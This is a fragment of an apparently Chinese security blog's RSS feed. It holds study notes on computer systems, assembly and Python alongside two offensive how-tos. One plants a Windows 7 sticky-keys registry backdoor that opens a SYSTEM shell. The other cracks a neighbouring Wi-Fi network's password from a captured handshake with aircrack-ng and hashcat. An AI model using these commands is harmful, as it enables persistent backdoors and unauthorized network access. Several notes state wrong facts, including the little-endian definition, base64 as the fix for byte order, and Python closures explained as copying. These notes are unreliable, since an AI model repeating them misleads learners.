        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>深入理解计算机系统第2章笔记</title>
        <description>&lt;p&gt;1.不同数据类型在不同位数的操作系统下的内存长度
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp2-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2.大端和小端
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp2-2.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp2-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;大端(big endian)以高位数值存到内存地址的低位(以大数结尾)&lt;br /&gt;
小端(little endian)以低位数值存到内存地址的高位(以小数结尾)&lt;br /&gt;
网络上的字节序为大端,而计算机上的字节序一般为小端,于是在发送到网络上之前需要转换一次,否则数据发送到目的地会被对方
理解错了,什么转换方法好呢?如果转换成char类型当然好,因为char类型的数据只占一个字节,没有大端和小端的区别,eg:
将int(127)发到网络上去,127需要(2**xx7=128)7bits也即1B的数据量传输,转成char类型为”127”需要(1,2,7分别作为char)需要
3B的传输量,这样的话需要传输3倍的数据量,效率太低了,于是不用这种方法,采用base64将本地数据编码后传输到网络上去&lt;/p&gt;

&lt;p&gt;3.数据的表现形式有两种:&lt;code class=&quot;highlighter-rouge&quot;&gt;无符号&lt;/code&gt;类型和&lt;code class=&quot;highlighter-rouge&quot;&gt;补码&lt;/code&gt;类型,负数用补码表示,可由对应正数取反加1得到,eg:-4的表示形式&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4的二进制表示形式是0100,取反加1为:1011+1=1100
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;4.负数的计算为:-1x最高位(1)x2x2..2[位数-1]+除最高位以外的其他位的正数值&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;B2T(X) = -x_{w-1} \cdot 2^{w-1} + \sum_{i=0}^{w-2} x_i \cdot 2^i&lt;/script&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eg,1100这个负数的值计算方法为:-1x1x2x2x2+1x2x2+0x2+0=-8+4=-4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;5.如果一个表达式中包含有符号数和无符号数则会默认将有符号数转换成无符号数&lt;/p&gt;
</description>
        <pubDate>Fri, 11 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/08/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC2%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/08/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC2%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>计算机系统</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>win7粘滞键后门</title>
        <description>&lt;h3 id=&quot;0x0-about&quot;&gt;0x0 About&lt;/h3&gt;

&lt;p&gt;win03下copy命令可制作粘滞键后门,测试在win7上copy方法无效,本文记录win7下的方法&lt;/p&gt;

&lt;h3 id=&quot;0x1-detail&quot;&gt;0x1 Detail&lt;/h3&gt;

&lt;p&gt;以管理员身份打开cmd.exe运行如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;其中sethc.exe可替换成magnify.exe(放大镜)或其他(eg.narrator.exe/osk.exe),替换成更隐藏的技巧可根据下面链接自由发挥&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://answers.microsoft.com/en-us/windows/forum/windows_7-performance/run-command/a2632e97-c8d1-4ab3-8df2-7e70a4448267&quot;&gt;AsULike&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;删除后门以管理员身份打开cmd.exe运行如下即可:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;REG DELETE &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;以上理论上适用于win vistar以上系统,只在win7上测试过.&lt;/p&gt;

&lt;p&gt;以上可由管理员权限得到system权限,也可用于替代psexec.exe -s cmd.exe开system权限&lt;/p&gt;
</description>
        <pubDate>Thu, 03 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/</guid>
        
        <category>后门</category>
        
        <category>win7</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>xlearn</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录安全界大牛分享经验 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/xlearn&quot;&gt;gitlink&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/xlearn/master/tk%E6%95%99%E4%B8%BB.jpg&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/xlearn/master/yuange.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/猪猪侠的白帽学习路线.png&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 01 Jul 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/07/01/xlearn/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/07/01/xlearn/</guid>
        
        <category>经验</category>
        
        <category>大牛经验</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>汇编指令备忘录</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录易忘汇编指令经典解释
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;p&gt;1.&lt;a href=&quot;http://www.fx115.net/qa-220-122690.aspx&quot;&gt;movsz/movsx&lt;/a&gt;&lt;br /&gt;
2.&lt;a href=&quot;http://baike.baidu.com/link?url=LW99HgDBFHx3Ao2Ep1JshAbaQT5O3QqsLqZYhi_a1mJ1tFPXc-S1Y9-JRmYKJQjXn0hR7vO6tIDDzXicIDLnrq&quot;&gt;lodsb/lodsw[stosb/stosw]&lt;/a&gt;&lt;br /&gt;
3.&lt;a href=&quot;http://bbs.bccn.net/thread-327979-1-1.html&quot;&gt;cdq&lt;/a&gt; &lt;a href=&quot;https://zhidao.baidu.com/question/576311402.html&quot;&gt;cdq-more&lt;/a&gt;&lt;br /&gt;
4.&lt;a href=&quot;http://baike.baidu.com/link?url=CT8ZZrc7HIQuiY5exSQr0uESH2sipINbLQr4APzLt8x2JRGo4mqTYw-NA6MigqE83mCndW2EhKDmUqRk-4io5_&quot;&gt;neg&lt;/a&gt;
5.sal/shl,sar/shr&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sal:算术左移
shl:逻辑左移
sar:算术右移[这四个当中唯一一个要考虑符号位的]
shr:逻辑右移 6.imul S/mul S,cdq/cltd,idiv S/div S

imul S&amp;lt;==&amp;gt;{R[edx]:R[eax]&amp;lt;-SxR[eax]}&amp;lt;==&amp;gt;有符号全64位乘法
mul S&amp;lt;==&amp;gt;{R[edx]:R[eax]&amp;lt;-SxR[eax]}&amp;lt;==&amp;gt;无符号全64位乘法
cdq/cltd&amp;lt;==&amp;gt;{R[edx]:R[eax]&amp;lt;-SignExtend(R[eax])}&amp;lt;==&amp;gt;转为四字(cdq是intel格式,cltd是att格式)
idiv S&amp;lt;==&amp;gt;{R[edx]&amp;lt;-R[edx]:R[eax] mod S;R[eax]&amp;lt;-R[edx]:R[eax] / S}&amp;lt;==&amp;gt;有符号除法
div S&amp;lt;==&amp;gt;{R[edx]&amp;lt;-R[edx]:R[eax] mod S;R[eax]&amp;lt;-R[edx]:R[eax] / S}&amp;lt;==&amp;gt;无符号除法

上面的:代表32位和低32位的分界符号
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;7.标志寄存器&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CF(carry flag):进位标志.最近的操作使最高位产生了进位.可用来检查无符号操作数的溢出
ZF(zero flag):零标志.最近的操作得出的结果为0
SF(sign flag):符号标志.最近的操作得到的结果为负数
OF(overflow flag):溢出标志.最近的操作导致一个补码溢出--正溢出或负溢出

cmp与sub指令在设置标志寄存器的标志位的行为一样
test与and指令在设置标志寄存器的标志位的行为一样
cmp和test改变标志寄存器,不改变操作数
sub和and改变标志寄存器,也改变操作数
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Thu, 29 Jun 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/06/29/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/06/29/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</guid>
        
        <category>汇编指令</category>
        
        <category>备忘</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>python子函数使用主函数变量</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python中子函数使用主函数变量方法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;子函数对主函数中的tmpvalue相当于复制,不是引用,下面子函数中只能读到主函数中的tmpvalue,不能修改主函数的tmpvalue

def mainfunc(folder, ext_list):
    tmpvalue=2 
    tmpvalueList = [&quot;3&quot;]

    def subfunc():
        print(tmpvalue)
        tmpvalue+=1
        print(tmpvalue)
        print(tmpvalueList)
        tmpvalueList[0]=(&quot;4&quot;)
        print(tmpvalueList)
    subfunc()
mainfunc(1,2)

------output------
Traceback (most recent call last):
  File &quot;3.py&quot;, line 13, in &amp;lt;module&amp;gt;
    mainfunc(1,2)
  File &quot;3.py&quot;, line 12, in mainfunc
    subfunc()
  File &quot;3.py&quot;, line 6, in subfunc
    print(tmpvalue)
UnboundLocalError: local variable 'tmpvalue' referenced before assignment
------output------

但是子函数中可以对主函数中的数组写,比变量功能强大,子函数可以改变主函数中的tmpvalueList

def mainfunc(folder, ext_list):
    tmpvalue=2 
    tmpvalueList = [&quot;3&quot;]

    def subfunc():
        print(tmpvalue)
        #tmpvalue+=1
        #print(tmpvalue)
        print(tmpvalueList)
        tmpvalueList[0]=(&quot;4&quot;)
        print(tmpvalueList)
    subfunc()
mainfunc(1,2)

-------output-------
2
['3']
['4']
-------output-------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 09 Jun 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/python/2017/06/09/python%E5%AD%90%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E4%B8%BB%E5%87%BD%E6%95%B0%E5%8F%98%E9%87%8F/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2017/06/09/python%E5%AD%90%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E4%B8%BB%E5%87%BD%E6%95%B0%E5%8F%98%E9%87%8F/</guid>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>wifi crack in macOS</title>
        <description>&lt;h3 id=&quot;0x00-必读link&quot;&gt;0x00 必读link&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://gist.github.com/victorreyesh/6532800
https://www.aircrack-ng.org/install.html
https://apple.stackexchange.com/questions/117843/equivalent-of-airodump-ng-for-max-os-x
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-airport&quot;&gt;0x01 airport&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -name &quot;airport&quot;
airport -s
    root in ~ λ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
                                SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
                                zhen d8:c8:e9:02:74:08 -83  4       Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)
                           @Hos-WiFi 94:b4:0f:73:7a:72 -88  44,+1   Y  -- NONE
                   HHT_10_2_229_225_ ac:cf:23:8c:70:b8 -44  11      Y  TW WPA2(PSK/AES/AES)
                                 www 50:bd:5f:6e:3f:44 -68  11,-1   Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
                          ziroom-11F b8:f8:83:d8:4a:2b -40  6,-1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)   

(target=www)
airport en1 sniff 11(en1 is the wifi netcard)
wait...(find / -name &quot;*.cap&quot;,/tmp/*.cap exists)
aircrack-ng -w ......./pass.txt -b 50:bd:5f:6e:3f:44 /tmp/*.cap
    或者将cap文件转成hashcat支持的格式再用hashcat破解:
    a.将https://github.com/hashcat/hashcat-utils/releases里面的cap2hccapx.bin放到kali64(vm)下运行得到hccapx文件,然后再运行:
    b.hashcat -a 3 -m 2500 output.hccapx ?d?d?d?d?d?d?d?d
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-attention&quot;&gt;0x02 Attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.aircrack-ng官网说airodump-ng和aireplay-ng在macOS不支持
    airodump-ng可以看到已经建立的wifi连接
    aireplay-ng可以主动攻击wifi,上面的airport en1 sniff 只能被动等待有人连接wifi
    ---detail...
    &quot; Mind you, airodump-ng and aireplay-ng are linux only and will not work under OSX native, so for reinjecting
     and sniffing you will have to use other means.

     If you have an intel Mac check out the VMware Fusion option which is mentioned lower on this page.&quot; 

     也即,目前macOS sierra下只好较被动的用airport sniff命令较长时间以保证期间有handshake,不可主动攻击

2.KisMac2不支持macOS sierra,目前新版本的macOS只能用上面的airport的被动方法crack wifi,除非找到了airodump-ng和
aireplay-ng的替代品
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-xwifi&quot;&gt;0x03 xwifi&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;以上自动化脚本成xwifi如下
https://github.com/3xp10it/xwifi/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 06 Jun 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/06/06/wifi-crack-in-macOS/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/06/06/wifi-crack-in-macOS/</guid>
        
        <category>wifi</category>
        
        <category>crack</category>
        
        <category>macOS</category>
        
        
        <category>web</category>
        
      </item>
    
  </channel>
</rss>
